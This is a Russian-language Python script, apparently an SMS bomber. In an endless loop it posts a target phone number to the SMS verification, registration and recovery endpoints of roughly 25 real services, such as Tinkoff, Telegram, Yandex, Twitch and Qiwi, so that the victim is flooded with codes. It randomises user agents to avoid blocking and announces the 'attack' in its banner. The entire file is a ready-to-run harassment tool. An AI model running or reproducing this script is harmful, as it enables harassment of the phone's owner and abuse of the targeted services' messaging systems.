import os, sys
import fake_useragent
import requests
from colorama import *
init()


x = 0
y = 0


def effect(message):
    for char in message:
        sys.stdout.write(char)
        sys.stdout.flush()

message22 = '\n        [\033[31m!\033[33m] АТАКА НАЧАЛАСЬ, ДЛЯ ОСТАНОВКИ НАЖМИТЕ CTRL + C [\033[31m!\033[33m] \n '

def _sms(phone):
    global x, y
    user = fake_useragent.UserAgent().random
    headers1 = {'user_agent': user}
    print(Fore.YELLOW)

    effect(message22)

    while True:
        try:
            a = requests.post("https://u.icq.net/api/v32/rapi/auth/sendCode",
                          json={"reqId": "91101-1606335718",
                                "params": {"phone": phone, "language": "ru-RU", "route": "sms",
                                           "devId": "ic1rtwz1s1Hj1O0r", "application": "icq"}}, headers=headers1, timeout=5.05)
            print('\n        [\033[32m+\033[33m] сообщение от icq отправлено!')
            x += 1
        except:
            y += 1
            print('\n        [\033[31m-\033[33m] сообщение от icq не отправлено!')
        try:
            a = requests.post("https://www.dns-shop.ru/auth/auth/fast-authorization/", data={"FastAuthorizationLoginLoadForm[login]" : phone}, headers=headers1, timeout=5.05)
            x += 1
            print('\n        [\033[32m+\033[33m] сообщение от dns-shop.ru отправлено!')
        except:
            y += 1
            print('\n        [\033[31m-\033[33m] сообщение от dns-shop.ru не отправлено!')
        try:
            a = requests.post("https://lenta.com/api/v1/registration/requestValidationCode", json={"phone" : "+" + phone}, headers=headers1, timeout=5.05)
            x += 1
            print('\n        [\033[32m+\033[33m] сообщение от lenta.com отправлено!')
        except:
            y += 1
            print('\n        [\033[31m-\033[33m] сообщение от lenta.com не отправлено!')
        try:
            a = requests.post("https://taxi.yandex.ru/3.0/auth",
                          json={"id": "fa137685fd594a9f86f529eec9543e96", "phone": phone}, headers=headers1, timeout=5.05)
            x += 1
            print('\n        [\033[32m+\033[33m] сообщение от taxi.yandex отправлено!')
        except:
            y += 1
            print('\n        [\033[31m-\033[33m] сообщение от taxi.yandex не отправлено!')
        try:
            a = requests.post("https://youla.ru/web-api/auth/request_code",
                          json={"phone": phone}, headers=headers1, timeout=5.05)
            x += 1
            print('\n        [\033[32m+\033[33m] сообщение от youla отправлено!')
        except:
            y += 1
            print('\n        [\033[31m-\033[33m] сообщение от youla не отправлено!')
        try:
            a = requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php", data={
                "msisdn": phone,
                "locale": "en",
                "countryCode": "ru",
                "version": "1",
                "k": "ic1rtwz1s1Hj1O0r",
                "r": "46763"
                }, headers=headers1, timeout=5.05)
            x += 1
            print('\n        [\033[32m+\033[33m] сообщение от icq.com отправлено!')
        except:
            y += 1
            print('\n        [\033[31m-\033[33m] сообщение от icq.com не отправлено!')
        try:
            a = requests.post("https://eda.yandex.ru/api/v1/user/request_authentication_code",
                          json={"phone_number": phone}, headers=headers1, timeout=5.05)
            x += 1
            print('\n        [\033[32m+\033[33m] сообщение от eda.yandex отправлено!')
        except:
            y += 1
            print('\n        [\033[31m-\033[33m] сообщение от eda.yandex не отправлено!')
        try:
            x += 1
            a = requests.post("https://shop.vsk.ru/ajax/auth/postSms/",
                          data={"phone": phone}, headers=headers1, timeout=5.05)
            print('\n        [\033[32m+\033[33m] сообщение от shop.vsk отправлено!')
        except:
            y += 1
            print('\n        [\033[31m-\033[33m] сообщение от shop.vsk не отправлено!')
        try:
            x += 1
            a = requests.post("https://ok.ru/dk?cmd=AnonymRecoveryStartPhoneLink&st.cmd=anonymRecoveryStartPhoneLink",
                          data={"st.r.phone": "+" + phone}, headers=headers1, timeout=5.05)
            print('\n        [\033[32m+\033[33m] сообщение от ok.ru отправлено!')
        except:
            y += 1
            print('\n        [\033[31m-\033[33m] сообщение от ok.ru не отправлено!')
        try:
            x += 1
            a = requests.post("https://nn-card.ru/api/1.0/register",
                              json={"phone": phone, "password": 'DDd7873456'}, headers=headers1, timeout=5.05)
            print('\n        [\033[32m+\033[33m] сообщение от nn-card отправлено!')
        except:
            y += 1
            print('\n        [\033[31m-\033[33m] сообщение от nn-card не отправлено!')
        try:
            x += 1
            a = requests.post("https://my.modulbank.ru/api/v2/auth/phone",
                          json={"CellPhone": phone[1:]}, headers=headers1, timeout=5.05)
            print('\n        [\033[32m+\033[33m] сообщение от my.modulbank отправлено!')
        except:
            y += 1
            print('\n        [\033[31m-\033[33m] сообщение от my.modulbank не отправлено!')
        try:
            x += 1
            a = requests.post(
            "https://www.tinkoff.ru/api/common/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=uRdqKtttiyJYz6ShCqO076kNyTraz7pa.m1-prod-api56&wuid=8604f6d4327bf4ef2fc2b3efb36c8e35",

            data={"phone": "+" + phone}, headers=headers1, timeout=5.05)
            print('\n        [\033[32m+\033[33m] сообщение от tinkoff отправлено!')
        except:
            y += 1
            print('\n        [\033[31m-\033[33m] сообщение от tinkoff не отправлено!')
        try:
            x += 1
            a = requests.post("https://sayan.rutaxi.ru/ajax_keycode.html?qip=962358614986707810&lang=ru&source=0",

                          data={"l": phone[1:]}, headers=headers1, timeout=5.05)
            print('\n        [\033[32m+\033[33m] сообщение от rutaxi отправлено!')
        except:
            y += 1
            print('\n        [\033[31m-\033[33m] сообщение от rutaxi не отправлено!')
        try:
            x += 1
            a = requests.post("https://my.modulbank.ru/api/v2/auth/phone",
                          data={"CellPhone": phone[1:]}, headers=headers1, timeout=5.05)
            print('\n        [\033[32m+\033[33m] сообщение от modulbank отправлено!')
        except:
            y += 1
            print('\n        [\033[31m-\033[33m] сообщение от modulbank не отправлено!')
        try:
            x += 1
            a = requests.post("https://ng-api.webbankir.com/user/v2/create",
                          json={"lastName": "уцвцу", "firstName": "цувцу", "middleName": "цуацуа",
                                "mobilePhone": phone, "email": "asadsd@mail.ru", "smsCode": ""}, headers=headers1, timeout=5.05)
            print('\n        [\033[32m+\033[33m] сообщение от webbankir отправлено!')
        except:
            y += 1
            print('\n        [\033[31m-\033[33m] сообщение от webbankir не отправлено!')
        try:
            x += 1
            a = requests.post("https://m.tiktok.com/node-a/send/download_link",  json={"slideVerify":0,"language":"ru","PhoneRegionCode":"7","Mobile":phone[1:],"page":{"pageName":"home","launchMode":"direct","trafficType":""}}, headers=headers1, timeout=5.05)
            print('\n        [\033[32m+\033[33m] сообщение от tiktok отправлено!')
        except:
            y += 1
            print('\n        [\033[31m-\033[33m] сообщение от tiktok не отправлено!')
        try:
            x += 1
            a = requests.post("https://api.sunlight.net/v3/customers/authorization/",  data={"phone": phone}, headers=headers1, timeout=5.05)
            print('\n        [\033[32m+\033[33m] сообщение от sunlight отправлено!')
        except:
            y += 1
            print('\n        [\033[31m-\033[33m] сообщение от sunlight не отправлено!')
        try:
            x += 1
            a = requests.post("https://cloud.mail.ru/api/v2/notify/applink",
            json={
            "phone": "+" + phone,
            "api": 2,
            "email": 'dgirherfib@gmaqil.com',
            "x-email": "x-email",
            }, headers=headers1, timeout=5.05)
            print('\n        [\033[32m+\033[33m] сообщение от mail.ru отправлено!')
        except:
            y += 1
            print('\n        [\033[31m-\033[33m] сообщение от mail.ru отправлено!')
        try:
            x += 1
            a = requests.post("https://mobile-api.qiwi.com/oauth/authorize",
            data={
            "response_type": "urn:qiwi:oauth:response-type:confirmation-id",
            "username": phone,
            "client_id": "android-qw",
            "client_secret": "zAm4FKq9UnSe7id",
            }, headers=headers1, timeout=5.05)
            print('\n        [\033[32m+\033[33m] сообщение от qiwi отправлено!')
        except:
            y += 1
            print('\n        [\033[31m-\033[33m] сообщение от qiwi не отправлено!')
        try:
            x += 1
            a = requests.post("https://lenta.com/api/v1/authentication/requestValidationCode",
                             json={"phone": "+" + phone}, headers=headers1, timeout=5.05)
            print('\n        [\033[32m+\033[33m] сообщение от tiktok отправлено!')
        except:
            y += 1
            print('\n        [\033[31m-\033[33m] сообщение от tiktok не отправлено!')
        try:
            x += 1
            a = requests.post("https://passport.twitch.tv/register?trusted_request=true",
            json={
            "birthday": {"day": 12, "month": 10, "year": 2000},
            "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp",
            "include_verification_code": True,
            "password": 'Danil5564554',
            "phone_number": phone,
            "username": 'bhtrtrrrtbhtrbhtr',
            }, headers=headers1, timeout=5.05)
            print('\n        [\033[32m+\033[33m] сообщение от twitch.tv отправлено!')
        except:
            y += 1
            print('\n        [\033[31m-\033[33m] сообщение от twitch.tv не отправлено!')
        try:
            x += 1
            a = requests.post("https://my.telegram.org/auth/send_password",
            data={"phone": "+" + phone}, headers=headers1, timeout=5.05)
            print('\n        [\033[32m+\033[33m] сообщение от telegram отправлено!')
        except:
            y += 1
            print('\n        [\033[31m-\033[33m] сообщение от telegram не отправлено!')
        try:
            x += 1
            a = requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
            params={'msisdn': phone}, headers=headers1, timeout=5.05)
            print('\n        [\033[32m+\033[33m] сообщение от mts.ru отправлено!')
        except:
            y += 1
            print('\n        [\033[31m-\033[33m] сообщение от mts.ru не отправлено!')
        try:
            x += 1
            a = requests.post('https://www.etm.ru/cat/runprog.html',
            data={'m_phone': phone, 'mode': 'sendSms', 'syf_prog': 'clients-services', 'getSysParam': 'yes'}, headers=headers1, timeout=5.05)
            #print('\n        [\033[32m+\033[33m] сообщение от etm.ru отправлено!')
        except:
            y += 1
            print('\n        [\033[31m-\033[33m] сообщение от etm.ru не отправлено!')
                
        try:
            x += 1
            requests.post(
                "https://www.icq.com/smsreg/requestPhoneValidation.php",
                data={
                    "msisdn": phone,
                    "locale": "en",
                    "countryCode": "ru",
                    "version": "1",
                    "k": "ic1rtwz1s1Hj1O0r",
                    "r": "46763",
                },
            )
            print('\n        [\033[32m+\033[33m] сообщение от icq.com отправлено!')
        except:
            y += 1
            print('\n        [\033[31m-\033[33m] сообщение от icq.com не отправлено!')

        try:
            x += 1
            requests.post(
                "https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                data={"st.r.phone": "+" + phone},
            )
            print('\n        [\033[32m+\033[33m] сообщение от ok.ru отправлено!')
        except:
            y += 1
            print('\n        [\033[31m-\033[33m] сообщение от ok.ru не отправлено!')


        try:
            x += 1
            requests.post(
                "https://eda.yandex/api/v1/user/request_authentication_code",
                json={"phone_number": "+" + phone},
            )
            print('\n        [\033[32m+\033[33m] сообщение от eda.yandex отправлено!')
        except:
            y += 1
            print('\n        [\033[31m-\033[33m] сообщение от eda.yandex не отправлено!')


        try:
            x += 1
            requests.post(
                "https://www.citilink.ru/registration/confirm/phone/+" + phone + "/"
            )
            print('\n        [\033[32m+\033[33m] сообщение от citilink.ru отправлено!')
        except:
            y += 1
            print('\n        [\033[31m-\033[33m] сообщение от citilink.ru не отправлено!')
